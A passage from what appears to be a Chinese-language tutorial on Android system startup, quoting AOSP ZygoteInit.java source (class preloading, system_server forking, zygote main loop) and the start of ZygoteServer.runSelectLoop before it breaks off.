Log.i(TAG, \"Installed AndroidKeyStoreProvider in \"\n                + (SystemClock.uptimeMillis() - startTime) + \"ms.\");\n        Trace.traceEnd(Trace.TRACE_TAG_DALVIK);\n\n        startTime = SystemClock.uptimeMillis();\n        Trace.traceBegin(\n                Trace.TRACE_TAG_DALVIK, \"Starting warm up of JCA providers\");\n        for (Provider p : Security.getProviders()) {\n            p.warmUpServiceProvision();\n        }\n        Log.i(TAG, \"Warmed up JCA providers in \"\n                + (SystemClock.uptimeMillis() - startTime) + \"ms.\");\n        Trace.traceEnd(Trace.TRACE_TAG_DALVIK);\n    }\n\n    private static boolean isExperimentEnabled(String experiment) {\n        boolean defaultValue = SystemProperties.getBoolean(\n                \"dalvik.vm.\" + experiment,\n                /*def=*/false);\n        // Can't use device_config since we are the zygote, and it's not initialized at this point.\n        return SystemProperties.getBoolean(\n                \"persist.device_config.\" + DeviceConfig.NAMESPACE_RUNTIME_NATIVE_BOOT\n                        + \".\" + experiment,\n                defaultValue);\n    }\n\n    /* package-private */ static boolean shouldProfileSystemServer() {\n        return isExperimentEnabled(\"profilesystemserver\");\n    }\n\n    private static boolean shouldProfileBootClasspath() {\n        return isExperimentEnabled(\"profilebootclasspath\");\n    }\n\n    /**\n     * Performs Zygote process initialization. Loads and initializes commonly used classes.\n     *\n     * Most classes only cause a few hundred bytes to be allocated, but a few will allocate a dozen\n     * Kbytes (in one case, 500+K).\n     */\n    private static void preloadClasses() {\n        final VMRuntime runtime = VMRuntime.getRuntime();\n\n        InputStream is;\n        try {\n            is = new FileInputStream(PRELOADED_CLASSES);\n        } catch (FileNotFoundException e) {\n            Log.e(TAG, \"Couldn't find \" + PRELOADED_CLASSES + \".\");\n            return;\n        }\n\n        Log.i(TAG, \"Preloading classes...\");\n        long startTime = SystemClock.uptimeMillis();\n\n        // Drop root perms while running static initializers.\n        final int reuid = Os.getuid();\n        final int regid = Os.getgid();\n\n        // We need to drop root perms only if we're already root. In the case of \"wrapped\"\n        // processes (see WrapperInit), this function is called from an unprivileged uid\n        // and gid.\n        boolean droppedPriviliges = false;\n        if (reuid == ROOT_UID &amp;&amp; regid == ROOT_GID) {\n            try {\n                Os.setregid(ROOT_GID, UNPRIVILEGED_GID);\n                Os.setreuid(ROOT_UID, UNPRIVILEGED_UID);\n            } catch (ErrnoException ex) {\n                throw new RuntimeException(\"Failed to drop root\", ex);\n            }\n\n            droppedPriviliges = true;\n        }\n\n        try {\n            BufferedReader br =\n                    new BufferedReader(new InputStreamReader(is), Zygote.SOCKET_BUFFER_SIZE);\n\n            int count = 0;\n            int missingLambdaCount = 0;\n            String line;\n            while ((line = br.readLine()) != null) {\n                // Skip comments and blank lines.\n                line = line.trim();\n                if (line.startsWith(\"#\") || line.equals(\"\")) {\n                    continue;\n                }\n\n                Trace.traceBegin(Trace.TRACE_TAG_DALVIK, line);\n                try {\n                    // Load and explicitly initialize the given class. Use\n                    // Class.forName(String, boolean, ClassLoader) to avoid repeated stack lookups\n                    // (to derive the caller's class-loader). Use true to force initialization, and\n                    // null for the boot classpath class-loader (could as well cache the\n                    // class-loader of this class in a variable).\n                    Class.forName(line, true, null);\n                    count++;\n                } catch (ClassNotFoundException e) {\n                    if (line.contains(\"$$Lambda$\")) {\n                        if (LOGGING_DEBUG) {\n                            missingLambdaCount++;\n                        }\n                    } else {\n                        Log.w(TAG, \"Class not found for preloading: \" + line);\n                    }\n                } catch (UnsatisfiedLinkError e) {\n                    Log.w(TAG, \"Problem preloading \" + line + \": \" + e);\n                } catch (Throwable t) {\n                    Log.e(TAG, \"Error preloading \" + line + \".\", t);\n                    if (t instanceof Error) {\n                        throw (Error) t;\n                    } else if (t instanceof RuntimeException) {\n                        throw (RuntimeException) t;\n                    } else {\n                        throw new RuntimeException(t);\n                    }\n                }\n                Trace.traceEnd(Trace.TRACE_TAG_DALVIK);\n            }\n\n            Log.i(TAG, \"...preloaded \" + count + \" classes in \"\n                    + (SystemClock.uptimeMillis() - startTime) + \"ms.\");\n            if (LOGGING_DEBUG &amp;&amp; missingLambdaCount != 0) {\n                Log.i(TAG, \"Unresolved lambda preloads: \" + missingLambdaCount);\n            }\n        } catch (IOException e) {\n            Log.e(TAG, \"Error reading \" + PRELOADED_CLASSES + \".\", e);\n        } finally {\n            IoUtils.closeQuietly(is);\n\n            // Fill in dex caches with classes, fields, and methods brought in by preloading.\n            Trace.traceBegin(Trace.TRACE_TAG_DALVIK, \"PreloadDexCaches\");\n            runtime.preloadDexCaches();\n            Trace.traceEnd(Trace.TRACE_TAG_DALVIK);\n\n            // If we are profiling the boot image, reset the Jit counters after preloading the\n            // classes. We want to preload for performance, and we can use method counters to\n            // infer what clases are used after calling resetJitCounters, for profile purposes.\n            if (shouldProfileBootClasspath()) {\n                Trace.traceBegin(Trace.TRACE_TAG_DALVIK, \"ResetJitCounters\");\n                VMRuntime.resetJitCounters();\n                Trace.traceEnd(Trace.TRACE_TAG_DALVIK);\n            }\n\n            // Bring back root. We'll need it later if we're in the zygote.\n            if (droppedPriviliges) {\n                try {\n                    Os.setreuid(ROOT_UID, ROOT_UID);\n                    Os.setregid(ROOT_GID, ROOT_GID);\n                } catch (ErrnoException ex) {\n                    throw new RuntimeException(\"Failed to restore root\", ex);\n                }\n            }\n        }\n    }\n\n    /**\n     * Load in things which are used by many apps but which cannot be put in the boot\n     * classpath.\n     */\n    private static void cacheNonBootClasspathClassLoaders() {\n        // Ordered dependencies first\n        final List&lt;SharedLibraryInfo&gt; libs = new ArrayList&lt;&gt;();\n        // These libraries used to be part of the bootclasspath, but had to be removed.\n        // Old system applications still get them for backwards compatibility reasons,\n        // so they are cached here in order to preserve performance characteristics.\n        libs.add(new SharedLibraryInfo(\n                \"/system/framework/android.hidl.base-V1.0-java.jar\", null /*packageName*/,\n                null /*codePaths*/, null /*name*/, 0 /*version*/, SharedLibraryInfo.TYPE_BUILTIN,\n                null /*declaringPackage*/, null /*dependentPackages*/, null /*dependencies*/,\n                false /*isNative*/));\n        libs.add(new SharedLibraryInfo(\n                \"/system/framework/android.hidl.manager-V1.0-java.jar\", null /*packageName*/,\n                null /*codePaths*/, null /*name*/, 0 /*version*/, SharedLibraryInfo.TYPE_BUILTIN,\n                null /*declaringPackage*/, null /*dependentPackages*/, null /*dependencies*/,\n                false /*isNative*/));\n\n        libs.add(new SharedLibraryInfo(\n                \"/system/framework/android.test.base.jar\", null /*packageName*/,\n                null /*codePaths*/, null /*name*/, 0 /*version*/, SharedLibraryInfo.TYPE_BUILTIN,\n                null /*declaringPackage*/, null /*dependentPackages*/, null /*dependencies*/,\n                false /*isNative*/));\n\n        if (Flags.enableApacheHttpLegacyPreload()) {\n            libs.add(new SharedLibraryInfo(\n                    \"/system/framework/org.apache.http.legacy.jar\", null /*packageName*/,\n                    null /*codePaths*/, null /*name*/, 0 /*version*/,\n                    SharedLibraryInfo.TYPE_BUILTIN, null /*declaringPackage*/,\n                    null /*dependentPackages*/, null /*dependencies*/, false /*isNative*/));\n        }\n\n        if (Flags.enableMediaAndLocationPreload()) {\n            // As these libraries are technically optional and not necessarily inherited from\n            // base_system.mk, only cache them if they exist.\n            final String mediaJarPath = \"/system/framework/com.android.media.remotedisplay.jar\";\n            if (new File(mediaJarPath).exists()) {\n                libs.add(new SharedLibraryInfo(\n                        mediaJarPath, null /*packageName*/,\n                        null /*codePaths*/, null /*name*/, 0 /*version*/,\n                        SharedLibraryInfo.TYPE_BUILTIN, null /*declaringPackage*/,\n                        null /*dependentPackages*/, null /*dependencies*/, false /*isNative*/));\n            }\n            final String locationJarPath = \"/system/framework/com.android.location.provider.jar\";\n            if (new File(locationJarPath).exists()) {\n                libs.add(new SharedLibraryInfo(\n                        locationJarPath, null /*packageName*/,\n                        null /*codePaths*/, null /*name*/, 0 /*version*/,\n                        SharedLibraryInfo.TYPE_BUILTIN, null /*declaringPackage*/,\n                        null /*dependentPackages*/, null /*dependencies*/, false /*isNative*/));\n            }\n        }\n\n        // WindowManager Extensions is an optional shared library that is required for WindowManager\n        // Jetpack to fully function. Since it is a widely used library, preload it to improve apps\n        // startup performance.\n        if (WindowManager.HAS_WINDOW_EXTENSIONS_ON_DEVICE) {\n            final String systemExtFrameworkPath =\n                    new File(Environment.getSystemExtDirectory(), \"framework\").getPath();\n            libs.add(new SharedLibraryInfo(\n                    systemExtFrameworkPath + \"/androidx.window.extensions.jar\",\n                    \"androidx.window.extensions\", null /*codePaths*/,\n                    \"androidx.window.extensions\", SharedLibraryInfo.VERSION_UNDEFINED,\n                    SharedLibraryInfo.TYPE_BUILTIN, null /*declaringPackage*/,\n                    null /*dependentPackages*/, null /*dependencies*/, false /*isNative*/));\n            libs.add(new SharedLibraryInfo(\n                    systemExtFrameworkPath + \"/androidx.window.sidecar.jar\",\n                    \"androidx.window.sidecar\", null /*codePaths*/,\n                    \"androidx.window.sidecar\", SharedLibraryInfo.VERSION_UNDEFINED,\n                    SharedLibraryInfo.TYPE_BUILTIN, null /*declaringPackage*/,\n                    null /*dependentPackages*/, null /*dependencies*/, false /*isNative*/));\n        }\n\n        ApplicationLoaders.getDefault().createAndCacheNonBootclasspathSystemClassLoaders(libs);\n    }\n\n    /**\n     * Runs several special GCs to try to clean up a few generations of softly- and final-reachable\n     * objects, along with any other garbage. This is only useful just before a fork().\n     */\n    private static void gcAndFinalize() {\n        ZygoteHooks.gcAndFinalize();\n    }\n\n    /**\n     * Finish remaining work for the newly forked system server process.\n     */\n    private static Runnable handleSystemServerProcess(ZygoteArguments parsedArgs) {\n        // set umask to 0077 so new files and directories will default to owner-only permissions.\n        Os.umask(S_IRWXG | S_IRWXO);\n\n        if (parsedArgs.mNiceName != null) {\n            Process.setArgV0(parsedArgs.mNiceName);\n        }\n\n        final String systemServerClasspath = Os.getenv(\"SYSTEMSERVERCLASSPATH\");\n        if (systemServerClasspath != null) {\n            // Capturing profiles is only supported for debug or eng builds since selinux normally\n            // prevents it.\n            if (shouldProfileSystemServer() &amp;&amp; (Build.IS_USERDEBUG || Build.IS_ENG)) {\n                try {\n                    Log.d(TAG, \"Preparing system server profile\");\n                    final String standaloneSystemServerJars =\n                            Os.getenv(\"STANDALONE_SYSTEMSERVER_JARS\");\n                    final String systemServerPaths = standaloneSystemServerJars != null\n                            ? String.join(\":\", systemServerClasspath, standaloneSystemServerJars)\n                            : systemServerClasspath;\n                    prepareSystemServerProfile(systemServerPaths);\n                    try {\n                        SystemProperties.set(\"debug.tracing.profile_system_server\", \"1\");\n                    } catch (RuntimeException e) {\n                        Slog.e(TAG, \"Failed to set debug.tracing.profile_system_server\", e);\n                    }\n                } catch (Exception e) {\n                    Log.wtf(TAG, \"Failed to set up system server profile\", e);\n                }\n            }\n        }\n\n        // Zygote can't set system properties due to permission denied. We need to be in System\n        // Server to set system properties, so we do it here instead of the more natural place in\n        // preloadClasses.\n        if (shouldProfileBootClasspath()) {\n            try {\n                SystemProperties.set(\"debug.tracing.profile_boot_classpath\", \"1\");\n            } catch (RuntimeException e) {\n                Slog.e(TAG, \"Failed to set debug.tracing.profile_boot_classpath\", e);\n            }\n        }\n\n        if (parsedArgs.mInvokeWith != null) {\n            String[] args = parsedArgs.mRemainingArgs;\n            // If we have a non-null system server class path, we'll have to duplicate the\n            // existing arguments and append the classpath to it. ART will handle the classpath\n            // correctly when we exec a new process.\n            if (systemServerClasspath != null) {\n                String[] amendedArgs = new String[args.length + 2];\n                amendedArgs[0] = \"-cp\";\n                amendedArgs[1] = systemServerClasspath;\n                System.arraycopy(args, 0, amendedArgs, 2, args.length);\n                args = amendedArgs;\n            }\n\n            WrapperInit.execApplication(parsedArgs.mInvokeWith,\n                    parsedArgs.mNiceName, parsedArgs.mTargetSdkVersion,\n                    VMRuntime.getCurrentInstructionSet(), null, args);\n\n            throw new IllegalStateException(\"Unexpected return from WrapperInit.execApplication\");\n        } else {\n            ClassLoader cl = getOrCreateSystemServerClassLoader();\n            if (cl != null) {\n                Thread.currentThread().setContextClassLoader(cl);\n            }\n\n            /*\n             * Pass the remaining arguments to SystemServer.\n             */\n            return ZygoteInit.zygoteInit(parsedArgs.mTargetSdkVersion,\n                    parsedArgs.mDisabledCompatChanges,\n                    parsedArgs.mRemainingArgs, cl);\n        }\n\n        /* should never reach here */\n    }\n\n    /**\n     * Create the classloader for the system server and store it in\n     * {@link sCachedSystemServerClassLoader}. This function is called through JNI in the forked\n     * system server process in the zygote SELinux domain.\n     */\n    private static ClassLoader getOrCreateSystemServerClassLoader() {\n        if (sCachedSystemServerClassLoader == null) {\n            final String systemServerClasspath = Os.getenv(\"SYSTEMSERVERCLASSPATH\");\n            if (systemServerClasspath != null) {\n                sCachedSystemServerClassLoader = createPathClassLoader(systemServerClasspath,\n                        VMRuntime.SDK_VERSION_CUR_DEVELOPMENT);\n            }\n        }\n        return sCachedSystemServerClassLoader;\n    }\n\n    /**\n     * Creates class loaders for standalone system server jars. This function is called through JNI\n     * in the forked system server process in the zygote SELinux domain.\n     */\n    private static void prefetchStandaloneSystemServerJars() {\n        if (shouldProfileSystemServer()) {\n            // We don't prefetch AOT artifacts if we are profiling system server, as we are going to\n            // JIT it.\n            // This method only gets called from native and should already be skipped if we profile\n            // system server. Still, be robust and check it again.\n            return;\n        }\n        String envStr = Os.getenv(\"STANDALONE_SYSTEMSERVER_JARS\");\n        if (TextUtils.isEmpty(envStr)) {\n            return;\n        }\n        for (String jar : envStr.split(\":\")) {\n            try {\n                SystemServerClassLoaderFactory.createClassLoader(\n                        jar, getOrCreateSystemServerClassLoader());\n            } catch (Error e) {\n                // We don't want the process to crash for this error because prefetching is just an\n                // optimization.\n                Log.e(TAG,\n                        String.format(\"Failed to prefetch standalone system server jar \\\"%s\\\": %s\",\n                                jar, e.toString()));\n            }\n        }\n    }\n\n    /**\n     * Note that preparing the profiles for system server does not require special selinux\n     * permissions. From the installer perspective the system server is a regular package which can\n     * capture profile information.\n     */\n    private static void prepareSystemServerProfile(String systemServerPaths)\n            throws RemoteException {\n        if (systemServerPaths.isEmpty()) {\n            return;\n        }\n        String[] codePaths = systemServerPaths.split(\":\");\n\n        final IInstalld installd = IInstalld.Stub\n                .asInterface(ServiceManager.getService(\"installd\"));\n\n        String systemServerPackageName = \"android\";\n        String systemServerProfileName = \"primary.prof\";\n        installd.prepareAppProfile(\n                systemServerPackageName,\n                UserHandle.USER_SYSTEM,\n                UserHandle.getAppId(Process.SYSTEM_UID),\n                systemServerProfileName,\n                codePaths[0],\n                /*dexMetadata*/ null);\n\n        File curProfileDir = Environment.getDataProfilesDePackageDirectory(\n                UserHandle.USER_SYSTEM, systemServerPackageName);\n        String curProfilePath = new File(curProfileDir, systemServerProfileName).getAbsolutePath();\n        File refProfileDir = Environment.getDataProfilesDePackageDirectory(\n                UserHandle.USER_SYSTEM, systemServerPackageName);\n        String refProfilePath = new File(refProfileDir, systemServerProfileName).getAbsolutePath();\n        VMRuntime.registerAppInfo(\n                systemServerPackageName,\n                curProfilePath,\n                refProfilePath,\n                codePaths,\n                VMRuntime.CODE_PATH_TYPE_PRIMARY_APK);\n    }\n\n    /**\n     * Sets the list of classes/methods for the hidden API\n     */\n    public static void setApiDenylistExemptions(String[] exemptions) {\n        VMRuntime.getRuntime().setHiddenApiExemptions(exemptions);\n    }\n\n    public static void setHiddenApiAccessLogSampleRate(int percent) {\n        VMRuntime.getRuntime().setHiddenApiAccessLogSamplingRate(percent);\n    }\n\n    /**\n     * Sets the implementation to be used for logging hidden API accesses\n     * @param logger the implementation of the VMRuntime.HiddenApiUsageLogger interface\n     */\n    public static void setHiddenApiUsageLogger(VMRuntime.HiddenApiUsageLogger logger) {\n        VMRuntime.getRuntime().setHiddenApiUsageLogger(logger);\n    }\n\n    /**\n     * Creates a PathClassLoader for the given class path that is associated with a shared\n     * namespace, i.e., this classloader can access platform-private native libraries.\n     *\n     * The classloader will add java.library.path to the native library path for the classloader\n     * namespace. Since it includes platform locations like /system/lib, this is only appropriate\n     * for platform code that don't need linker namespace isolation (as opposed to APEXes and apps).\n     */\n    static ClassLoader createPathClassLoader(String classPath, int targetSdkVersion) {\n        String libraryPath = System.getProperty(\"java.library.path\");\n\n        // We use the boot class loader, that's what the runtime expects at AOT.\n        ClassLoader parent = ClassLoader.getSystemClassLoader().getParent();\n\n        return ClassLoaderFactory.createClassLoader(classPath, libraryPath, libraryPath,\n                parent, targetSdkVersion, true /* isNamespaceShared */, null /* classLoaderName */);\n    }\n\n    /**\n     * Prepare the arguments and forks for the system server process.\n     *\n     * @return A {@code Runnable} that provides an entrypoint into system_server code in the child\n     * process; {@code null} in the parent.\n     */\n    private static Runnable forkSystemServer(String abiList, String socketName,\n            ZygoteServer zygoteServer) {\n        long capabilities =\n                (1L &lt;&lt; OsConstants.CAP_IPC_LOCK) |\n                (1L &lt;&lt; OsConstants.CAP_KILL) |\n                (1L &lt;&lt; OsConstants.CAP_NET_ADMIN) |\n                (1L &lt;&lt; OsConstants.CAP_NET_BIND_SERVICE) |\n                (1L &lt;&lt; OsConstants.CAP_NET_BROADCAST) |\n                (1L &lt;&lt; OsConstants.CAP_NET_RAW) |\n                (1L &lt;&lt; OsConstants.CAP_SYS_MODULE) |\n                (1L &lt;&lt; OsConstants.CAP_SYS_NICE) |\n                (1L &lt;&lt; OsConstants.CAP_SYS_PTRACE) |\n                (1L &lt;&lt; OsConstants.CAP_SYS_TIME) |\n                (1L &lt;&lt; OsConstants.CAP_SYS_TTY_CONFIG) |\n                (1L &lt;&lt; OsConstants.CAP_WAKE_ALARM) |\n                (1L &lt;&lt; OsConstants.CAP_BLOCK_SUSPEND);\n        /* Containers run without some capabilities, so drop any caps that are not available. */\n        StructCapUserHeader header = new StructCapUserHeader(\n                OsConstants._LINUX_CAPABILITY_VERSION_3, 0);\n        StructCapUserData[] data;\n        try {\n            data = Os.capget(header);\n        } catch (ErrnoException ex) {\n            throw new RuntimeException(\"Failed to capget()\", ex);\n        }\n        capabilities &amp;= Integer.toUnsignedLong(data[0].effective) |\n                (Integer.toUnsignedLong(data[1].effective) &lt;&lt; 32);\n\n        /* Hardcoded command line to start the system server */\n        String[] args = {\n                \"--setuid=1000\",\n                \"--setgid=1000\",\n                \"--setgroups=1001,1002,1003,1004,1005,1006,1007,1008,1009,1010,1018,1021,1023,\"\n                        + \"1024,1032,1065,3001,3002,3003,3005,3006,3007,3009,3010,3011,3012\",\n                \"--capabilities=\" + capabilities + \",\" + capabilities,\n                \"--nice-name=system_server\",\n                \"--runtime-args\",\n                \"--target-sdk-version=\" + VMRuntime.SDK_VERSION_CUR_DEVELOPMENT,\n                \"com.android.server.SystemServer\",\n        };\n        ZygoteArguments parsedArgs;\n\n        int pid;\n\n        try {\n            ZygoteCommandBuffer commandBuffer = new ZygoteCommandBuffer(args);\n            try {\n                parsedArgs = ZygoteArguments.getInstance(commandBuffer);\n            } catch (EOFException e) {\n                throw new AssertionError(\"Unexpected argument error for forking system server\", e);\n            }\n            commandBuffer.close();\n            Zygote.applyDebuggerSystemProperty(parsedArgs);\n            Zygote.applyInvokeWithSystemProperty(parsedArgs);\n\n            if (Zygote.nativeSupportsMemoryTagging()) {\n                String mode = SystemProperties.get(\"persist.arm64.memtag.system_server\", \"\");\n                if (mode.isEmpty()) {\n                  /* The system server has ASYNC MTE by default, in order to allow\n                   * system services to specify their own MTE level later, as you\n                   * can't re-enable MTE once it's disabled. */\n                  mode = SystemProperties.get(\"persist.arm64.memtag.default\", \"async\");\n                }\n                if (mode.equals(\"async\")) {\n                    parsedArgs.mRuntimeFlags |= Zygote.MEMORY_TAG_LEVEL_ASYNC;\n                } else if (mode.equals(\"sync\")) {\n                    parsedArgs.mRuntimeFlags |= Zygote.MEMORY_TAG_LEVEL_SYNC;\n                } else if (!mode.equals(\"off\")) {\n                    /* When we have an invalid memory tag level, keep the current level. */\n                    parsedArgs.mRuntimeFlags |= Zygote.nativeCurrentTaggingLevel();\n                    Slog.e(TAG, \"Unknown memory tag level for the system server: \\\"\" + mode + \"\\\"\");\n                }\n            } else if (Zygote.nativeSupportsTaggedPointers()) {\n                /* Enable pointer tagging in the system server. Hardware support for this is present\n                 * in all ARMv8 CPUs. */\n                parsedArgs.mRuntimeFlags |= Zygote.MEMORY_TAG_LEVEL_TBI;\n            }\n\n            /* Enable gwp-asan on the system server with a small probability. This is the same\n             * policy as applied to native processes and system apps. */\n            parsedArgs.mRuntimeFlags |= Zygote.GWP_ASAN_LEVEL_LOTTERY;\n\n            if (shouldProfileSystemServer()) {\n                parsedArgs.mRuntimeFlags |= Zygote.PROFILE_SYSTEM_SERVER;\n            }\n\n            /* Request to fork the system server process */\n            pid = Zygote.forkSystemServer(\n                    parsedArgs.mUid, parsedArgs.mGid,\n                    parsedArgs.mGids,\n                    parsedArgs.mRuntimeFlags,\n                    null,\n                    parsedArgs.mPermittedCapabilities,\n                    parsedArgs.mEffectiveCapabilities);\n        } catch (IllegalArgumentException ex) {\n            throw new RuntimeException(ex);\n        }\n\n        /* For child process */\n        if (pid == 0) {\n            if (hasSecondZygote(abiList)) {\n                waitForSecondaryZygote(socketName);\n            }\n\n            zygoteServer.closeServerSocket();\n            return handleSystemServerProcess(parsedArgs);\n        }\n\n        return null;\n    }\n\n    /**\n     * This is the entry point for a Zygote process.  It creates the Zygote server, loads resources,\n     * and handles other tasks related to preparing the process for forking into applications.\n     *\n     * This process is started with a nice value of -20 (highest priority).  All paths that flow\n     * into new processes are required to either set the priority to the default value or terminate\n     * before executing any non-system code.  The native side of this occurs in SpecializeCommon,\n     * while the Java Language priority is changed in ZygoteInit.handleSystemServerProcess,\n     * ZygoteConnection.handleChildProc, and Zygote.childMain.\n     *\n     * @param argv  Command line arguments used to specify the Zygote's configuration.\n     */\n    @UnsupportedAppUsage\n    public static void main(String[] argv) {\n        ZygoteServer zygoteServer = null;\n\n        // Mark zygote start. This ensures that thread creation will throw\n        // an error.\n        ZygoteHooks.startZygoteNoThreadCreation();\n\n        // Zygote goes into its own process group.\n        try {\n            Os.setpgid(0, 0);\n        } catch (ErrnoException ex) {\n            throw new RuntimeException(\"Failed to setpgid(0,0)\", ex);\n        }\n\n        Runnable caller;\n        try {\n            // Store now for StatsLogging later.\n            final long startTime = SystemClock.elapsedRealtime();\n            final boolean isRuntimeRestarted = \"1\".equals(\n                    SystemProperties.get(\"sys.boot_completed\"));\n\n            String bootTimeTag = Process.is64Bit() ? \"Zygote64Timing\" : \"Zygote32Timing\";\n            TimingsTraceLog bootTimingsTraceLog = new TimingsTraceLog(bootTimeTag,\n                    Trace.TRACE_TAG_DALVIK);\n            bootTimingsTraceLog.traceBegin(\"ZygoteInit\");\n            RuntimeInit.preForkInit();\n\n            boolean startSystemServer = false;\n            String zygoteSocketName = \"zygote\";\n            String abiList = null;\n            boolean enableLazyPreload = false;\n            for (int i = 1; i &lt; argv.length; i++) {\n                if (\"start-system-server\".equals(argv[i])) {\n                    startSystemServer = true;\n                } else if (\"--enable-lazy-preload\".equals(argv[i])) {\n                    enableLazyPreload = true;\n                } else if (argv[i].startsWith(ABI_LIST_ARG)) {\n                    abiList = argv[i].substring(ABI_LIST_ARG.length());\n                } else if (argv[i].startsWith(SOCKET_NAME_ARG)) {\n                    zygoteSocketName = argv[i].substring(SOCKET_NAME_ARG.length());\n                } else {\n                    throw new RuntimeException(\"Unknown command line argument: \" + argv[i]);\n                }\n            }\n\n            final boolean isPrimaryZygote = zygoteSocketName.equals(Zygote.PRIMARY_SOCKET_NAME);\n            if (!isRuntimeRestarted) {\n                if (isPrimaryZygote) {\n                    FrameworkStatsLog.write(FrameworkStatsLog.BOOT_TIME_EVENT_ELAPSED_TIME_REPORTED,\n                            BOOT_TIME_EVENT_ELAPSED_TIME__EVENT__ZYGOTE_INIT_START,\n                            startTime);\n                } else if (zygoteSocketName.equals(Zygote.SECONDARY_SOCKET_NAME)) {\n                    FrameworkStatsLog.write(FrameworkStatsLog.BOOT_TIME_EVENT_ELAPSED_TIME_REPORTED,\n                            BOOT_TIME_EVENT_ELAPSED_TIME__EVENT__SECONDARY_ZYGOTE_INIT_START,\n                            startTime);\n                }\n            }\n\n            if (abiList == null) {\n                throw new RuntimeException(\"No ABI list supplied.\");\n            }\n\n            // In some configurations, we avoid preloading resources and classes eagerly.\n            // In such cases, we will preload things prior to our first fork.\n            if (!enableLazyPreload) {\n                bootTimingsTraceLog.traceBegin(\"ZygotePreload\");\n                EventLog.writeEvent(LOG_BOOT_PROGRESS_PRELOAD_START,\n                        SystemClock.uptimeMillis());\n                preload(bootTimingsTraceLog);\n                EventLog.writeEvent(LOG_BOOT_PROGRESS_PRELOAD_END,\n                        SystemClock.uptimeMillis());\n                bootTimingsTraceLog.traceEnd(); // ZygotePreload\n            }\n\n            // Do an initial gc to clean up after startup\n            bootTimingsTraceLog.traceBegin(\"PostZygoteInitGC\");\n            gcAndFinalize();\n            bootTimingsTraceLog.traceEnd(); // PostZygoteInitGC\n\n            bootTimingsTraceLog.traceEnd(); // ZygoteInit\n\n            Zygote.initNativeState(isPrimaryZygote);\n\n            ZygoteHooks.stopZygoteNoThreadCreation();\n\n            zygoteServer = new ZygoteServer(isPrimaryZygote);\n\n            if (startSystemServer) {\n                Runnable r = forkSystemServer(abiList, zygoteSocketName, zygoteServer);\n\n                // {@code r == null} in the parent (zygote) process, and {@code r != null} in the\n                // child (system_server) process.\n                if (r != null) {\n                    r.run();\n                    return;\n                }\n            }\n\n            Log.i(TAG, \"Accepting command socket connections\");\n\n            // The select loop returns early in the child process after a fork and\n            // loops forever in the zygote.\n            caller = zygoteServer.runSelectLoop(abiList);\n        } catch (Throwable ex) {\n            Log.e(TAG, \"System zygote died with fatal exception\", ex);\n            throw ex;\n        } finally {\n            if (zygoteServer != null) {\n                zygoteServer.closeServerSocket();\n            }\n        }\n\n        // We're in the child process and have exited the select loop. Proceed to execute the\n        // command.\n        if (caller != null) {\n            caller.run();\n        }\n    }\n\n    /**\n     * Return {@code true} if this device configuration has another zygote.\n     *\n     * We determine this by comparing the device ABI list with this zygotes list. If this zygote\n     * supports all ABIs this device supports, there won't be another zygote.\n     */\n    private static boolean hasSecondZygote(String abiList) {\n        return !SystemProperties.get(\"ro.product.cpu.abilist\").equals(abiList);\n    }\n\n    private static void waitForSecondaryZygote(String socketName) {\n        String otherZygoteName = Zygote.PRIMARY_SOCKET_NAME.equals(socketName)\n                ? Zygote.SECONDARY_SOCKET_NAME : Zygote.PRIMARY_SOCKET_NAME;\n        ZygoteProcess.waitForConnectionToZygote(otherZygoteName);\n    }\n\n    static boolean isPreloadComplete() {\n        return sPreloadComplete;\n    }\n\n    /**\n     * Class not instantiable.\n     */\n    private ZygoteInit() {\n    }\n\n    /**\n     * The main function called when started through the zygote process. This could be unified with\n     * main(), if the native code in nativeFinishInit() were rationalized with Zygote startup.&lt;p&gt;\n     *\n     * Current recognized args:\n     * &lt;ul&gt;\n     * &lt;li&gt; &lt;code&gt; [--] &amp;lt;start class name&amp;gt;  &amp;lt;args&amp;gt;\n     * &lt;/ul&gt;\n     *\n     * @param targetSdkVersion target SDK version\n     * @param disabledCompatChanges set of disabled compat changes for the process (all others\n     *                              are enabled)\n     * @param argv             arg strings\n     */\n    public static Runnable zygoteInit(int targetSdkVersion, long[] disabledCompatChanges,\n            String[] argv, ClassLoader classLoader) {\n        if (RuntimeInit.DEBUG) {\n            Slog.d(RuntimeInit.TAG, \"RuntimeInit: Starting application from zygote\");\n        }\n\n        Trace.traceBegin(Trace.TRACE_TAG_ACTIVITY_MANAGER, \"ZygoteInit\");\n        RuntimeInit.redirectLogStreams();\n\n        RuntimeInit.commonInit();\n        ZygoteInit.nativeZygoteInit();\n        return RuntimeInit.applicationInit(targetSdkVersion, disabledCompatChanges, argv,\n                classLoader);\n    }\n\n    /**\n     * The main function called when starting a child zygote process. This is used as an alternative\n     * to zygoteInit(), which skips calling into initialization routines that start the Binder\n     * threadpool.\n     */\n    static Runnable childZygoteInit(String[] argv) {\n        RuntimeInit.Arguments args = new RuntimeInit.Arguments(argv);\n        return RuntimeInit.findStaticMain(args.startClass, args.startArgs, /* classLoader= */null);\n    }\n\n    private static native void nativeZygoteInit();\n}\n</code></pre> <p>\u6211\u4eec\u770b\u770b ZygoteInit \u6700\u540e\u542f\u52a8 zygoteServer.runSelectLoop \u65b9\u6cd5:</p> /frameworks/base/core/java/com/android/internal/os/ZygoteServer.java<pre><code>// runSelectLoop \u65b9\u6cd5 line 173:263\n    Runnable runSelectLoop(String abiList) {\n        ArrayList&lt;FileDescriptor&gt; fds = new ArrayList&lt;FileDescriptor&gt;();\n        ArrayList&lt;ZygoteConnection&gt; peers = new ArrayList&lt;ZygoteConnection&gt;();\n\n        fds.add(mServerSocket.getFileDescriptor());\n        peers.add(null);\n\n        while (true) {\n            StructPollfd[] pollFds = new StructPollfd[fds.size()];\n            for (int i = 0; i &lt; pollFds.length; ++i) {\n                pollFds[i] = new StructPollfd();\n                pollFds[i].fd = fds.get(i);\n                pollFds[i].events = (short) POLLIN;\n            }\n            try {\n                Os.poll(pollFds, -1);\n            } catch (ErrnoException ex) {\n                throw new RuntimeException(\"poll failed\", ex);\n            }\n            for (int i = pollFds.length - 1; i &gt;= 0; --i) {\n                if ((pollFds[i].revents &amp; POLLIN) == 0) {\n                    continue;\n                }\n\n                if (i == 0) {\n                    ZygoteConnection newPeer = acceptCommandPeer(abiList);\n                    peers.add(newPeer);\n                    fds.add(newPeer.getFileDesciptor());\n                } else {\n                    try {\n                        ZygoteConnection connection = peers.get(i);\n                        final Runnable command = connection.processOneCommand(this);\n\n                        if (mIsForkChild) {\n//...\n                        }\n                    } catch (Exception e) {\n//...\n                    } finally {\n                        // Reset the child flag, in the event that the child process is a child-\n                        // zygote. The flag will not be consulted this loop pass after the Runnable\n                        